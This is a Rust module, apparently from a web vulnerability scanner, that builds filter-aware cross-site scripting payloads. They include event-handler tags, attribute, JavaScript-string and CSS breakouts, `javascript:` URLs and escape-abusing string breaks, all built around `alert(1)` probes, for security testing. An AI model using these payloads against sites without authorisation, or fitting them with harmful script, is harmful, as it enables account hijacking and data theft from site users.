//! Filter-constrained generative payload synthesis (issue #1075).
//!
//! Stage 3 active probing records, per parameter, which of the
//! [`crate::parameter_analysis::SPECIAL_PROBE_CHARS`] a server-side filter
//! reflects unchanged (`valid_specials`) versus strips / encodes
//! (`invalid_specials`), together with the [`InjectionContext`] the value lands
//! in. The static payload catalogs ([`crate::payload::get_dynamic_xss_html_payloads`]
//! et al.) can only express shapes written ahead of time, so a custom filter
//! that allows an unusual subset of characters can slip past every catalog
//! entry while still being exploitable with a *constructed* payload.
//!
//! This module turns that probed filter profile into payloads. It assembles a
//! prioritised set of candidate shapes for the detected context, then keeps
//! only the candidates whose every character survives the filter — so the
//! "never emit a blocked character" guarantee falls out of construction rather
//! than being re-checked downstream. Output is ordered by descending confidence
//! (the scan loop is first-hit-wins, so the most likely shapes must come first)
//! and carries the scan's DOM markers so a reflected synthesized payload can
//! promote straight to a verified ([V]) finding.
//!
//! Synthesis is intentionally *small and high-signal*: it runs before the broad
//! catalog and is capped at [`MAX_SYNTHESIZED`]. It augments, never replaces,
//! the catalog — anything synthesis cannot express still gets the full catalog
//! behind it.

use crate::parameter_analysis::{DelimiterType, InjectionContext};

/// Upper bound on synthesized payloads returned for a single (context, filter)
/// pair. Synthesis is meant to be a compact set that runs *before* the full
/// catalog, so this stays well under the catalog size.
const MAX_SYNTHESIZED: usize = 48;

/// JavaScript execution primitives, highest-preference first. Gating happens
/// later via [`FilterProfile::allows_str`], so e.g. the backtick form survives a
/// filter that strips `(` / `)` while the paren forms are dropped, and the
/// `confirm`/`print` alternates survive a denylist on the literal `alert`.
const JS_FUNCS: &[&str] = &["alert(1)", "alert`1`", "confirm(1)"];

/// What a parameter's server-side filter permits.
struct FilterProfile<'a> {
    invalid: &'a [char],
}

impl<'a> FilterProfile<'a> {
    fn new(invalid: &'a [char]) -> Self {
        Self { invalid }
    }

    /// A character is usable unless active probing positively classified it as
    /// filtered. Characters outside [`crate::parameter_analysis::SPECIAL_PROBE_CHARS`]
    /// (letters, digits, space, `&`, `#`, …) are never probed and are always
    /// assumed usable — markers and tag/handler names are alphanumeric and so
    /// always pass.
    #[inline]
    fn allows(&self, c: char) -> bool {
        !self.invalid.contains(&c)
    }

    /// True when every character of `s` is usable.
    fn allows_str(&self, s: &str) -> bool {
        s.chars().all(|c| self.allows(c))
    }
}

// === Context-specific candidate templates, ordered by descending confidence ===
//
// Placeholders, substituted before the filter pass:
//   {JS}    a JavaScript execution primitive from `JS_FUNCS`
//   {CLASS} the scan's class DOM marker  (enables [V] via class selector)
//   {ID}    the scan's id DOM marker     (enables [V] via id selector)
//
// These are plain `&str` constants (not `format!` templates), so `{{` is NOT an
// escape: `${{JS}}` is the six literal characters `$ { { J S } }`, and
// `replace("{JS}", "alert(1)")` rewrites the inner `{JS}` to yield the template
// literal interpolation `${alert(1)}`.

/// HTML text / element-content context: a tag must be injected, which needs
/// `<` and `>`. When those are filtered every candidate here is dropped and the
/// caller falls back to the catalog (or attribute-context synthesis for values
/// that also echo into an attribute).
const HTML_TEMPLATES: &[&str] = &[
    "<svg onload={JS} class={CLASS}>",
    "<img src=x onerror={JS} class={CLASS}>",
    "<svg/onload={JS}/class={CLASS}>",
    "<details open ontoggle={JS} class={CLASS}>",
    "<svg onload={JS} id={ID}>",
    "<img src=x onerror={JS} id={ID}>",
    "<body onload={JS} class={CLASS}>",
    "<marquee onstart={JS} class={CLASS}>",
    "<video src=x onerror={JS} class={CLASS}>",
    "<script class={CLASS}>{JS}</script>",
    // Marker-less fallbacks ([R] only): useful when the marker attribute name
    // itself is what the filter rejects but a bare tag still lands.
    "<svg onload={JS}>",
    "<img src=x onerror={JS}>",
];

/// Inside an HTML comment (`<!-- … -->`): close the comment, then inject a tag.
const HTML_COMMENT_TEMPLATES: &[&str] = &[
    "--><svg onload={JS} class={CLASS}>",
    "--><img src=x onerror={JS} class={CLASS}>",
    "--!><svg onload={JS} class={CLASS}>",
    "--><svg/onload={JS}/class={CLASS}>",
];

/// Single-quoted attribute value. The "stay-in-tag" event-injection shapes need
/// no `<`/`>`, so they survive angle-stripping filters; the breakout shapes
/// follow for the common case where angles are allowed.
const ATTR_SQ_TEMPLATES: &[&str] = &[
    "' onmouseover={JS} class={CLASS} x='",
    "' autofocus onfocus={JS} class={CLASS} x='",
    "' ontoggle={JS} popover class={CLASS} x='",
    "' onbeforeinput={JS} contenteditable class={CLASS} x='",
    "' onmouseover={JS} id={ID} x='",
    "'><svg onload={JS} class={CLASS}>",
    "'><img src=x onerror={JS} class={CLASS}>",
    "'><svg/onload={JS}/class={CLASS}>",
    "'><svg onload={JS} id={ID}>",
];

/// Double-quoted attribute value (mirror of [`ATTR_SQ_TEMPLATES`]).
const ATTR_DQ_TEMPLATES: &[&str] = &[
    "\" onmouseover={JS} class={CLASS} x=\"",
    "\" autofocus onfocus={JS} class={CLASS} x=\"",
    "\" ontoggle={JS} popover class={CLASS} x=\"",
    "\" onbeforeinput={JS} contenteditable class={CLASS} x=\"",
    "\" onmouseover={JS} id={ID} x=\"",
    "\"><svg onload={JS} class={CLASS}>",
    "\"><img src=x onerror={JS} class={CLASS}>",
    "\"><svg/onload={JS}/class={CLASS}>",
    "\"><svg onload={JS} id={ID}>",
];

/// Unquoted attribute value: a space starts a new attribute on the same tag, or
/// `>` closes the tag and a fresh tag follows.
const ATTR_UNQUOTED_TEMPLATES: &[&str] = &[
    "x onmouseover={JS} class={CLASS} ",
    "x autofocus onfocus={JS} class={CLASS} ",
    "x ontoggle={JS} popover class={CLASS} ",
    "x onmouseover={JS} id={ID} ",
    "><svg onload={JS} class={CLASS}>",
    "><img src=x onerror={JS} class={CLASS}>",
];

/// URL-bearing attribute value (`href` / `src` / …): the protocol itself
/// executes, no quote breakout required.
const ATTR_URL_TEMPLATES: &[&str] = &["javascript:{JS}", "javascript:{JS}//"];

/// Single-quoted JavaScript string literal.
const JS_SQ_TEMPLATES: &[&str] = &[
    "';{JS}//",
    "'-{JS}-'",
    "'+{JS}+'",
    "');{JS}//",
    "'}};{JS};'",
    "</script><svg onload={JS} class={CLASS}>",
];

/// Double-quoted JavaScript string literal (mirror of [`JS_SQ_TEMPLATES`]).
const JS_DQ_TEMPLATES: &[&str] = &[
    "\";{JS}//",
    "\"-{JS}-\"",
    "\"+{JS}+\"",
    "\");{JS}//",
    "\"}};{JS};\"",
    "</script><svg onload={JS} class={CLASS}>",
];

/// JavaScript template literal (backtick string): `${expr}` evaluates without
/// escaping the surrounding backtick. `${{JS}}` → `${…}` (see header note).
const JS_BACKTICK_TEMPLATES: &[&str] = &[
    "${{JS}}",
    "`;{JS}//",
    "`-{JS}-`",
    "</script><svg onload={JS} class={CLASS}>",
];

/// Inside a JavaScript block comment.
const JS_COMMENT_TEMPLATES: &[&str] = &[
    "*/{JS}/*",
    "*/{JS}//",
    "\n{JS}\n",
    "</script><svg onload={JS} class={CLASS}>",
];

/// Raw JavaScript context (e.g. `var x = INJECT;`): no string to break out of.
///
/// The two `/`-led templates close an enclosing **regex literal** (`var re =
/// /^INJECT$/`) before running the payload: `compute_js_breakout` deliberately
/// treats `/` only as division/comment (never a regex delimiter), so it never
/// emits these — but a reflection inside a regex literal is a real, if uncommon,
/// JS sink. `/;{JS}//` → `…/^/;alert(1)//$/…` (regex `/^/`, then the statement).
const JS_RAW_TEMPLATES: &[&str] = &[
    "{JS}",
    ";{JS};",
    ";{JS}//",
    "/;{JS}//",
    "/;{JS};/",
    "</script><svg onload={JS} class={CLASS}>",
];

/// CSS context with no string delimiter (`<style>…INJECT…</style>`).
const CSS_PLAIN_TEMPLATES: &[&str] = &[
    "</style><svg onload={JS} class={CLASS}>",
    "</style><img src=x onerror={JS} class={CLASS}>",
    "}</style><svg onload={JS} class={CLASS}>",
];

/// CSS context inside a single-quoted value.
const CSS_SQ_TEMPLATES: &[&str] = &[
    "');}</style><svg onload={JS} class={CLASS}>",
    "</style><svg onload={JS} class={CLASS}>",
];

/// CSS context inside a double-quoted value.
const CSS_DQ_TEMPLATES: &[&str] = &[
    "\");}</style><svg onload={JS} class={CLASS}>",
    "</style><svg onload={JS} class={CLASS}>",
];

/// Pick the candidate template set for `context`, ordered by descending
/// confidence.
fn templates_for(context: &InjectionContext) -> Vec<&'static str> {
    match context {
        InjectionContext::Html(Some(DelimiterType::Comment)) => HTML_COMMENT_TEMPLATES.to_vec(),
        InjectionContext::Html(_) => HTML_TEMPLATES.to_vec(),
        InjectionContext::Attribute(delim) | InjectionContext::AttributeUrl(delim) => {
            let mut t: Vec<&'static str> = match delim {
                Some(DelimiterType::SingleQuote) => ATTR_SQ_TEMPLATES.to_vec(),
                Some(DelimiterType::DoubleQuote) => ATTR_DQ_TEMPLATES.to_vec(),
                // Backtick / Comment delimiters aren't meaningful for HTML
                // attribute values; treat them as unquoted.
                _ => ATTR_UNQUOTED_TEMPLATES.to_vec(),
            };
            if matches!(context, InjectionContext::AttributeUrl(_)) {
                t.extend_from_slice(ATTR_URL_TEMPLATES);
            }
            t
        }
        InjectionContext::Javascript(delim) => {
            let mut t = match delim {
                Some(DelimiterType::SingleQuote) => JS_SQ_TEMPLATES.to_vec(),
                Some(DelimiterType::DoubleQuote) => JS_DQ_TEMPLATES.to_vec(),
                Some(DelimiterType::Backtick) => JS_BACKTICK_TEMPLATES.to_vec(),
                Some(DelimiterType::Comment) => JS_COMMENT_TEMPLATES.to_vec(),
                None => JS_RAW_TEMPLATES.to_vec(),
            };
            // The quote-delimiter heuristic only looks for the nearest matching
            // quote, so it mis-classifies a raw JS *expression* position — a
            // template-literal `${ … }` substitution, or an object-literal value
            // slot `{"k": …}` — as a single/double/backtick string. There every
            // string-breakout template is a syntax error, so also offer the
            // bare-expression payload `{JS}` (`alert(1)`), which executes directly
            // in expression position. In a genuine string context it reflects as
            // inert string text and never AST-verifies (promotion requires the
            // injected call to overlap the payload span — see
            // `js_context_verify::has_js_context_evidence`), so this is strictly
            // recall-additive with no false-positive risk.
            if matches!(
                delim,
                Some(
                    DelimiterType::SingleQuote
                        | DelimiterType::DoubleQuote
                        | DelimiterType::Backtick
                )
            ) {
                t.push("{JS}");
            }
            t
        }
        InjectionContext::Css(delim) => match delim {
            Some(DelimiterType::SingleQuote) => CSS_SQ_TEMPLATES.to_vec(),
            Some(DelimiterType::DoubleQuote) => CSS_DQ_TEMPLATES.to_vec(),
            _ => CSS_PLAIN_TEMPLATES.to_vec(),
        },
    }
}

/// Construct filter-constrained payloads for `context` given the characters the
/// parameter's filter blocks (`invalid_specials`) and allows (`valid_specials`).
///
/// Returns a deduplicated, confidence-ordered list (most likely first), capped
/// at [`MAX_SYNTHESIZED`]. Every returned payload is guaranteed to use only
/// characters not present in `invalid_specials`. May return an empty vec when no
/// candidate shape survives the filter (e.g. an HTML-text reflection with `<`
/// stripped) — callers fall back to the catalog.
///
/// Payloads use the default `alert(1)` / `` alert`1` `` execution primitives;
/// `--custom-alert-value` substitution is not applied (consistent with the
/// existing adaptive-payload path, and immaterial to detection since promotion
/// to [V] is marker-based, not alert-value based).
///
/// `escaped_specials` (issue #1072) lists quote characters the server reflects
/// only in backslash-escaped form (`"` → `\"`). For a JS-string context whose
/// delimiter is escaped, synthesis leads with a backslash-prefixed breakout
/// (`\";…`), which the server's own escaping turns into a working string break.
/// `observed_js_breakout` (issue #1073 follow-up) is the exact breakout closer
/// computed from the *real* inline-`<script>` source observed at this
/// parameter's reflection point (see [`crate::parameter_analysis::Param::js_breakout`]).
/// When present for a JS context, synthesis emits the matching breakout *first*
/// — ahead of the fixed depth-0–3 catalog — so a site whose nesting the fixed
/// shells don't cover (deeper or unusual nesting) is still reached. It is
/// strictly additive: the fixed catalog still follows as a fallback, and the
/// observed closer dedupes against it when they coincide.
pub fn synthesize_payloads(
    context: &InjectionContext,
    invalid_specials: &[char],
    valid_specials: &[char],
    escaped_specials: &[char],
    observed_js_breakout: Option<&str>,
) -> Vec<String> {
    // `valid_specials` is accepted for symmetry with `generate_adaptive_payloads`
    // and forward use (e.g. confidence weighting); gating is expressed purely as
    // "not known-blocked" so that non-probed characters stay usable.
    let _ = valid_specials;

    let profile = FilterProfile::new(invalid_specials);
    let class = crate::scanning::markers::class_marker();
    let id = crate::scanning::markers::id_marker();

    // Candidate templates, highest-confidence first.
    let mut templates: Vec<String> = Vec::new();
    // Issue #1073: for a reflection inside a JS string, lead with nested-closer
    // breakouts (`"]});…`) that escape the open string and any unbalanced
    // `([{` so sinks the bare quote-close cannot reach are still executed.
    // `observed_js_breakout` (when present) is the closer computed from the
    // *real* script prefix at this exact site — the per-parameter carrier
    // follow-up — and is emitted first. The fixed depth-0–3 catalog
    // (`breakout_templates`) always follows as a fallback for sites without an
    // observed prefix, so coverage is strictly additive and the two dedupe when
    // they coincide. Every breakout is gated by `allows_str` below like any
    // other template.
    if let InjectionContext::Javascript(delim) = context {
        let quote = match delim {
            Some(DelimiterType::SingleQuote) => Some('\''),
            Some(DelimiterType::DoubleQuote) => Some('"'),
            Some(DelimiterType::Backtick) => Some('`'),
            Some(DelimiterType::Comment) | None => None,
        };
        // Issue #1073 follow-up: lead with the breakout computed from the real
        // observed script prefix at this exact site, so nesting the fixed shells
        // don't cover is still escaped. Emitted before the catalog (highest
        // confidence) and deduped against it. When the delimiter is one the
        // server backslash-escapes (#1072), prepend a `\` like the escaped
        // catalog set, so the server's own escaping turns our quote into a real
        // string break (`\"]});…` → `\\"]});…` → literal `\` + closing quote).
        if let Some(closer) = observed_js_breakout {
            let escaped = quote.is_some_and(|q| escaped_specials.contains(&q));
            let lead = if escaped { "\\" } else { "" };
            templates.push(format!("{lead}{closer};{{JS}}//"));
        }
        if let Some(q) = quote {
            // Issue #1072: when the server backslash-escapes this delimiter the
            // raw nested breakout is *inert* (`"]});…` → `\"]});…`), so emit the
            // backslash-prefixed nested breakouts instead — the server's escaping
            // converts those into a real string break (`\";…` → `\\";…` → literal
            // `\` + closing quote). Emitting one set (not both raw+escaped) keeps
            // the synthesis cap free for the marker-carrying `</script>` template
            // (which works under escaping regardless). The static `JS_*_TEMPLATES`
            // below still provide the depth-0 forms. A non-escaping delimiter
            // keeps the raw nested set.
            if escaped_specials.contains(&q) {
                templates.extend(crate::payload::js_breakout::escaped_breakout_templates(q));
            } else {
                templates.extend(crate::payload::js_breakout::breakout_templates(q));
            }
        }
    }
    templates.extend(templates_for(context).into_iter().map(String::from));

    let mut out: Vec<String> = Vec::new();
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();

    'outer: for template in &templates {
        for func in JS_FUNCS {
            let payload = template
                .replace("{JS}", func)
                .replace("{CLASS}", class)
                .replace("{ID}", id);

            // Filter-constraint guarantee: never emit a payload that uses a
            // character the server's filter strips. This single check is what
            // makes the output "constrained" — construction above is optimistic.
            // (A template carrying no `{JS}` would produce the same string for
            // every `func`; `seen` collapses those duplicates, so no special
            // casing is needed.)
            if profile.allows_str(&payload) && seen.insert(payload.clone()) {
                out.push(payload);
                if out.len() >= MAX_SYNTHESIZED {
                    break 'outer;
                }
            }
        }
    }

    out
}

#[cfg(test)]
mod tests;
